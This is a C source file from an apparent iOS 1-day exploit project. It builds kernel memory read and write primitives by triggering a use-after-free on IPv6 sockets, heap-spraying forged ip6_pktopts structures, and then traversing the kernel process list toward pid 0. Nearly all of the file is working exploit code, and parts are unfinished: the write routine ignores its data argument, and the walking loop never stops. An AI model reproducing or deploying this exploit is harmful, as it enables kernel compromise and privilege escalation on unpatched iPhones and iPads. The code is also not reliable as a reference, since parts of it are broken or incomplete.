//
//  read.c
//  1_day_iOS
//
//  Created by System on 30/11/2020.
//  Copyright Â© 2020 System. All rights reserved.
//

#include "read.h"
#include "spray.h"

int Read_data_64(uint64_t addr,uint64_t * recv_data){
    uint8_t buf[20] = {};
    
    if(!Read_data(addr,buf,0))
    {
        printf("ERROR!! failed in Read_64");
        return 0;
    }
    memcpy((uint8_t *)recv_data,buf,8);

    for(int i=0;i<3;i++){
        printf("rcv %d : 0x%llx\n",i,*((uint64_t *)buf+i));
    }
    if((*recv_data >> 32) != 0xfffffff0){
        printf("wrong address : 0x%llx\n",*recv_data);
        return 0;
    }
    return 1;
}
int Read_data_32(uint64_t addr,uint32_t * recv_data){
    uint8_t buf[20];
    if(!Read_data(addr,buf,0))
    {
        printf("ERROR!! failed in Read_64");
        return 0;
    }
    for(int i=0;i<3;i++){
        printf("rcv %d : 0x%llx\n",i,*((uint64_t *)buf+i));
    }
    memcpy((uint8_t *)recv_data,buf,4);
    return 1;
}


int Read_data(uint64_t addr , uint8_t * buf,int freeing){
    uint32_t dangling_count = 2;
    int *dangling_p = (int *)malloc(sizeof(int) * dangling_count);
    
    for(int i=0;i<dangling_count;i++){
        int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
       
        struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT,
            .npx_mask = SONPX_SETOPTSHUT};
        int res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
        if (res != 0)
        {
            printf("ERROR!! failed on setsocketopt\n");
        }
        int minmtu = IP6PO_MINMTU_ALL;
        res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        if (res != 0)
        {
            printf("ERROR!! failed on setIPV6opt\n");
        }
        dangling_p[i] = s;
      
    }
    for(int i=0;i<dangling_count;i++)
          disconnectx(dangling_p[i], 0, 0);
    uint8_t * buffer = (uint8_t *)malloc(sizeof(struct ip6_pktopts));
    memset(buffer, 0, sizeof(struct ip6_pktopts));
    memset(buffer + offsetof(struct ip6_pktopts , ip6po_minmtu), 'B',4);
    memcpy(buffer + offsetof(struct ip6_pktopts , ip6po_pktinfo) , &addr , 8);
    
    int attempt_to_spray = 20;
    for(int i=0;i<attempt_to_spray;i++){
        int spray_count = 256;
        if(!spray(buffer , (uint32_t)sizeof(struct ip6_pktopts),spray_count)){
            printf("ERROR!! failed on spray");
        }
        int minmtu = -1;
        socklen_t size_minmtu = sizeof(minmtu);
        for (uint32_t j = 0; j < dangling_count; j++) {
            
            int res = getsockopt(dangling_p[j], IPPROTO_IPV6,IPV6_USE_MIN_MTU,&minmtu,&size_minmtu);
            
            if(res != 0){
                printf("failed on getsockopt on MINMTU!!\n");
                continue;
            }
            
            if (minmtu != 0x42424242) {
                // We don't see the 'B' pattern, keep looking
                usleep(10000);
                continue;
            }
            
            struct in6_pktinfo pktinfo = {};
            socklen_t size_pktinfo = sizeof(pktinfo);
            if(freeing){
                int res = setsockopt(dangling_p[j], IPPROTO_IPV6, IPV6_PKTINFO, &pktinfo,size_pktinfo);
                if (res != 0) {
                    printf("failed on setsockopt!!\n");
                    return 0;
                }
                
            }
            else{
            res = getsockopt(dangling_p[j], IPPROTO_IPV6,IPV6_PKTINFO,&pktinfo,&size_pktinfo);
            
            if(res != 0){
                printf("failed on getsockopt!!\n");
                continue;
            
            }
            memcpy(buf, &pktinfo, size_pktinfo);
            }
            //printf("SUCCESS!!\n\n");
            /*
            for(int i=0;i<dangling_count;i++)
                close(dangling_p[i]);
            free(dangling_p);*/
            free(buffer);
            sleep(0.1);
                
                return 1;
        }
    }
    return 0;
}

int write_data(uint64_t addr,uint64_t data){
    uint32_t dangling_count = 3;
    int *dangling_p = (int *)malloc(sizeof(int) * dangling_count);
    
    for(int i=0;i<dangling_count;i++){
        int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        
        struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT,
            .npx_mask = SONPX_SETOPTSHUT};
        int res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
        if (res != 0)
        {
            printf("ERROR!! failed on setsocketopt\n");
        }
        int minmtu = IP6PO_MINMTU_ALL;
        res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        if (res != 0)
        {
            printf("ERROR!! failed on setIPV6opt\n");
        }
        dangling_p[i] = s;
        
    }
    for(int i=0;i<dangling_count;i++)
        disconnectx(dangling_p[i], 0, 0);
    uint8_t * buffer = (uint8_t *)malloc(sizeof(struct ip6_pktopts));
    memset(buffer, 0, sizeof(struct ip6_pktopts));
    memset(buffer + offsetof(struct ip6_pktopts , ip6po_minmtu), 'B',4);
    memcpy(buffer + offsetof(struct ip6_pktopts , ip6po_pktinfo) , &addr , 8);
    
    int attempt_to_spray = 20;
    for(int i=0;i<attempt_to_spray;i++){
        int spray_count = 256;
        if(!spray(buffer , (uint32_t)sizeof(struct ip6_pktopts),spray_count)){
            printf("ERROR!! failed on spray");
        }
        int minmtu = -1;
        socklen_t size_minmtu = sizeof(minmtu);
        for (uint32_t j = 0; j < dangling_count; j++) {
            
            int res = getsockopt(dangling_p[j], IPPROTO_IPV6,IPV6_USE_MIN_MTU,&minmtu,&size_minmtu);
            
            if(res != 0){
                printf("failed on getsockopt on MINMTU!!\n");
                continue;
            }
            
            if (minmtu != 0x42424242) {
                // We don't see the 'B' pattern, keep looking
                usleep(10000);
                continue;
            }
            
            struct in6_pktinfo pktinfo = {};
          //  memcpy(&pktinfo,&data,8);
            socklen_t size_pktinfo = sizeof(pktinfo);
                 res = setsockopt(dangling_p[j], IPPROTO_IPV6, IPV6_PKTINFO, &pktinfo,size_pktinfo);
                if (res != 0) {
                    printf("failed on setsockopt!!\n");
                    return 0;
                }
                
            
            //printf("SUCCESS!!\n\n");
            /*
            for(int i=0;i<dangling_count;i++)
                close(dangling_p[i]);*/
            free(dangling_p);
            free(buffer);
            sleep(0.1);
            
            return 1;
        }
    }
    return 0;
}

void im2(uint64_t port)
{
    uint64_t task;
    uint64_t proc;
    uint32_t pid;
    /*
    if(!Read_data_64(port + 104, &task)){
        printf("ERROR!! failed on reading task address\n");
        return ;
    }
    printf("recevied task address : 0x%llx\n",task);
    if(!Read_data_64(task + 0x358,&proc)){
        printf("ERROR!! failed on reading proc address\n");
        return ;
    }*/
    int cnt = 0;
    proc = 0xfffffff00159ebe8;
    printf("recevied proc address : 0x%llx\n",proc);
    while(1){
        cnt +=1;
        if(cnt > 50){
            printf("stop\n");
        }
        Read_data_32(proc + 0x60,&pid);
        printf("pid : %d proc_address : 0x%llx\n",pid,proc);
        if(pid == 0)
        {
            printf("hooray\n");
        }
        if(!Read_data_64(proc , &proc)){
            printf("ERROR!! failed on reading task address\n");
            return ;
        }
    }
}
